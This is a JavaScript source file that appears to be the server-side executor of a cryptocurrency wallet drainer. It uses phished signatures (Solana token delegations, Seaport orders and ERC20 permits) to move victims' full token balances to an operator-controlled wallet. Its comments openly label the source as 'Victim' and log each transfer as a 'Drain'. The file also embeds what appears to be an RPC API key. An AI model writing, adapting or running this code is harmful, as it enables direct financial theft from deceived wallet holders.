const { ethers } = require('ethers');
const { Connection, Transaction, PublicKey, Keypair } = require('@solana/web3.js');
const { createTransferInstruction, getAssociatedTokenAddress, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } = require('@solana/spl-token');

// --- 🔧 FIX: Robust bs58 import for all versions ---
const bs58_module = require('bs58');
const bs58 = {
    decode: bs58_module.decode || (bs58_module.default ? bs58_module.default.decode : null)
};
// ---------------------------------------------------

// --- CONFIGURATION ---
const RPC_URLS = {
  1: process.env.REACT_APP_ETH_RPC || 'https://rpc.ankr.com/eth/fbc280c9827fd7043fd8758e3eef5cf31e1a9ead96e3efba457f7dcae984112d',
  56: 'https://bsc-dataseed.binance.org',
  137: 'https://polygon-rpc.com',
  42161: 'https://arb1.arbitrum.io/rpc',
  10: 'https://mainnet.optimism.io',

  ethereum: process.env.REACT_APP_ETH_RPC || 'https://rpc.ankr.com/eth/fbc280c9827fd7043fd8758e3eef5cf31e1a9ead96e3efba457f7dcae984112d',
  bnb: 'https://bsc-dataseed.binance.org',
  polygon: 'https://polygon-rpc.com',
  arbitrum: 'https://arb1.arbitrum.io/rpc',
  optimism: 'https://mainnet.optimism.io',
  solana: process.env.REACT_APP_SOLANA_RPC || 'https://solana-rpc.publicnode.com',  
};

// Admin Wallet for EVM (Private Key)
const EVM_PRIVATE_KEY = process.env.EVM_PRIVATE_KEY; 
// Admin Wallet for Solana (Private Key as Uint8Array or BS58 string)
const SOLANA_PRIVATE_KEY_STRING = process.env.SOLANA_PRIVATE_KEY; 

const SEAPORT_ADDRESS = '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC';
const SEAPORT_ABI = [
  'function fulfillBasicOrder((address considerationToken, uint256 considerationIdentifier, uint256 considerationAmount, address offerer, address zone, address offerToken, uint256 offerIdentifier, uint256 offerAmount, uint8 basicOrderType, uint256 startTime, uint256 endTime, bytes32 zoneHash, uint256 salt, bytes32 offererConduitKey, bytes32 fulfillerConduitKey, uint256 totalOriginalAdditionalRecipients, (uint256 amount, address recipient)[] additionalRecipients, bytes signature) parameters) payable returns (bool)'
];
const ERC20_ABI = [
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
  'function transferFrom(address from, address to, uint256 amount) public returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)'
];

// Helper to get Solana Admin Keypair
function getSolanaAdmin() {
    if (!SOLANA_PRIVATE_KEY_STRING) throw new Error("SOLANA_PRIVATE_KEY missing in .env");
    
    // Check if it's a JSON array (Uint8Array format)
    if (SOLANA_PRIVATE_KEY_STRING.includes('[')) {
        return Keypair.fromSecretKey(Uint8Array.from(JSON.parse(SOLANA_PRIVATE_KEY_STRING)));
    }
    
    // Ensure bs58.decode exists before using it
    if (!bs58.decode) {
        throw new Error("bs58.decode is missing. Try running: npm install bs58@4.0.1");
    }

    return Keypair.fromSecretKey(bs58.decode(SOLANA_PRIVATE_KEY_STRING));
}

async function executeSignedAction({ submissionData }) {
  const { asset, signature, message, chainId, payload } = submissionData;
  const { type, address: assetAddress, symbol } = asset;
  const payloadMessage = message || submissionData.payload?.message || {};

  console.log('\n═══════════════════════════════════════════');
  console.log(`🤖 EXECUTOR: Processing ${type} for ${symbol}`);
  console.log('═══════════════════════════════════════════');

  try {
    // ============================================
    // CASE 1: SOLANA (Drain via Delegate)
    // ============================================
    if (chainId === 'solana') {
        const { type: payloadType } = payload; // payloadType to avoid conflict with asset.type

          console.log('\n═══════════════════════════════════════════');
          console.log(`🤖 Processing ${payloadType} on solana`);
          console.log('═══════════════════════════════════════════');

        if (payloadType === 'SOL_APPROVE') {
            console.log("☀️ Executing Solana Delegate Drain...");
            const connection = new Connection(RPC_URLS.solana, "confirmed");
            const adminWallet = getSolanaAdmin();
            const victimPubkey = new PublicKey(submissionData.user);
            const mintPubkey = new PublicKey(assetAddress);

            // 1. Get Token Accounts
            const sourceAccount = await getAssociatedTokenAddress(mintPubkey, victimPubkey, false, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID);
            const destinationAccount = await getAssociatedTokenAddress(mintPubkey, adminWallet.publicKey, false, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID);

            // 2. Build Transfer Instruction
            // NOTE: We sign as 'adminWallet' because we are the Delegate
            const amountToDrain = BigInt(asset.balance); // Drain full balance
            
            const tx = new Transaction().add(
                createTransferInstruction(
                    sourceAccount,      // From (Victim)
                    destinationAccount, // To (Admin)
                    adminWallet.publicKey, // Signer (Delegate/Admin)
                    amountToDrain,
                    [],
                    TOKEN_PROGRAM_ID
                )
            );

            // 3. Send
            const txHash = await connection.sendTransaction(tx, [adminWallet]);
            console.log(`✅ Solana Drain Success: https://solscan.io/tx/${txHash}`);
            return true;
        } 
        else if (payloadType === 'SOL_TRANSFER' || payloadType === 'SOL_TX') {
            console.log(`ℹ️ Native Solana Transfer already executed by user. Hash: ${signature}`);
            return true;
        }
    }

    // ============================================
    // EVM SETUP
    // ============================================
    const rpcUrl = RPC_URLS[chainId];
    if (!rpcUrl) throw new Error(`Unsupported Chain ID: ${chainId}`);
    
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const executorWallet = new ethers.Wallet(EVM_PRIVATE_KEY, provider);

    // ============================================
    // CASE 2: SEAPORT (Order Fulfillment)
    // ============================================
    if (['ERC20', 'BEP20', 'ERC721'].includes(type) && payloadMessage.offer) {
       console.log(`🌊 Executing Seaport Order...`);
       const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, executorWallet);
       
       const params = {
         considerationToken: assetAddress,
         considerationIdentifier: 0,
         considerationAmount: asset.balance,
         offerer: submissionData.user,
         zone: '0x0000000000000000000000000000000000000000',
         offerToken: assetAddress,
         offerIdentifier: 0,
         offerAmount: asset.balance,
         basicOrderType: 16,
         startTime: payloadMessage.startTime,
         endTime: payloadMessage.endTime,
         zoneHash: payloadMessage.zoneHash,
         salt: payloadMessage.salt,
         offererConduitKey: payloadMessage.conduitKey,
         fulfillerConduitKey: '0x0000000000000000000000000000000000000000000000000000000000000000',
         totalOriginalAdditionalRecipients: 0,
         additionalRecipients: [],
         signature: signature
       };

       const tx = await seaport.fulfillBasicOrder(params);
       console.log(`✅ Seaport Drain Sent: ${tx.hash}`);
       await tx.wait();
       return true;
    }

    // ============================================
    // CASE 3: ERC20 PERMIT (Permit + TransferFrom)
    // ============================================
    if (type === 'ERC20_PERMIT') {
       console.log(`📝 Executing ERC20 Permit...`);
       const tokenContract = new ethers.Contract(assetAddress, ERC20_ABI, executorWallet);
       const sig = ethers.Signature.from(signature);

       // 1. Submit Permit (Gasless Approval)
       // Check allowance first to save gas
       const allowance = await tokenContract.allowance(submissionData.user, executorWallet.address);
       if (allowance < BigInt(payloadMessage.value)) {
           console.log("   -> Submitting Permit on-chain...");
           const permitTx = await tokenContract.permit(
               submissionData.user, 
               executorWallet.address, 
               payloadMessage.value, 
               payloadMessage.deadline, 
               sig.v, sig.r, sig.s
           );
           await permitTx.wait();
       }

       // 2. Transfer Funds
       console.log("   -> Transferring funds...");
       const transferTx = await tokenContract.transferFrom(
           submissionData.user, 
           executorWallet.address, 
           asset.balance
       );
       console.log(`✅ Permit Drain Success: ${transferTx.hash}`);
       return true;
    }

    // ============================================
    // CASE 4: NATIVE (Already Done)
    // ============================================
    if (type === 'NATIVE' || type === 'NATIVE_TX') {
        console.log(`✅ Native transfer confirmed by user: ${signature}`);
        return true;
    }

  } catch (error) {
    console.error("❌ Execution Failed:", error.message);
    return false;
  }
}

module.exports = { executeSignedAction };